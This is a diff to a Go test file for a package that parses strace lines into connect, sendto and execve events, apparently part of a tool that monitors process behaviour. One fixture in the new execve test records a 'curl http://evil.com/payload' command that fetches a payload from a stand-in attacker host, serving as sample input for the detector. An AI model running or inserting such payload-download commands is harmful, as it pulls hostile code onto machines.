@@ -1,13 +1,21 @@
 package probe
 
-import "testing"
+import (
+	"testing"
 
-func TestParseStraceLine_IPv4(t *testing.T) {
+	"github.com/RalianENG/kojuto/internal/types"
+)
+
+func TestParseStraceLine_Connect_IPv4(t *testing.T) {
 	line := `[pid 12345] connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = -1 ENETUNREACH`
 
 	evt, ok := parseStraceLine(line)
 	if !ok {
 		t.Fatal("expected parse to succeed")
+	}
+
+	if evt.Syscall != types.EventConnect {
+		t.Errorf("expected syscall connect, got %s", evt.Syscall)
 	}
 
 	if evt.DstPort != 443 {
@@ -18,16 +26,12 @@ func TestParseStraceLine_IPv4(t *testing.T) {
 		t.Errorf("expected addr 93.184.216.34, got %s", evt.DstAddr)
 	}
 
-	if evt.Family != 2 {
-		t.Errorf("expected family 2 (AF_INET), got %d", evt.Family)
-	}
-
 	if evt.PID != 12345 {
 		t.Errorf("expected pid 12345, got %d", evt.PID)
 	}
 }
 
-func TestParseStraceLine_IPv6(t *testing.T) {
+func TestParseStraceLine_Connect_IPv6(t *testing.T) {
 	line := `[pid 999] connect(5, {sa_family=AF_INET6, sin6_port=htons(80), sin6_addr=inet6_addr("::1")}, 28) = 0`
 
 	evt, ok := parseStraceLine(line)
@@ -38,9 +42,51 @@ func TestParseStraceLine_IPv6(t *testing.T) {
 	if evt.Family != 10 {
 		t.Errorf("expected family 10 (AF_INET6), got %d", evt.Family)
 	}
+}
 
-	if evt.DstAddr != "::1" {
-		t.Errorf("expected addr ::1, got %s", evt.DstAddr)
+func TestParseStraceLine_Sendto(t *testing.T) {
+	line := `[pid 500] sendto(4, "\0\0\1\0\0\1...", 29, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 29`
+
+	evt, ok := parseStraceLine(line)
+	if !ok {
+		t.Fatal("expected sendto parse to succeed")
+	}
+
+	if evt.Syscall != types.EventSendto {
+		t.Errorf("expected syscall sendto, got %s", evt.Syscall)
+	}
+
+	if evt.DstPort != 53 {
+		t.Errorf("expected port 53, got %d", evt.DstPort)
+	}
+
+	if evt.DstAddr != "8.8.8.8" {
+		t.Errorf("expected addr 8.8.8.8, got %s", evt.DstAddr)
+	}
+}
+
+func TestParseStraceLine_Execve(t *testing.T) {
+	line := `[pid 777] execve("/usr/bin/curl", ["curl", "http://evil.com/payload"], 0x...) = 0`
+
+	evt, ok := parseStraceLine(line)
+	if !ok {
+		t.Fatal("expected execve parse to succeed")
+	}
+
+	if evt.Syscall != types.EventExecve {
+		t.Errorf("expected syscall execve, got %s", evt.Syscall)
+	}
+
+	if evt.Comm != "/usr/bin/curl" {
+		t.Errorf("expected comm /usr/bin/curl, got %s", evt.Comm)
+	}
+
+	if evt.Cmdline != "curl http://evil.com/payload" {
+		t.Errorf("expected cmdline 'curl http://evil.com/payload', got %q", evt.Cmdline)
+	}
+
+	if evt.PID != 777 {
+		t.Errorf("expected pid 777, got %d", evt.PID)
 	}
 }
 
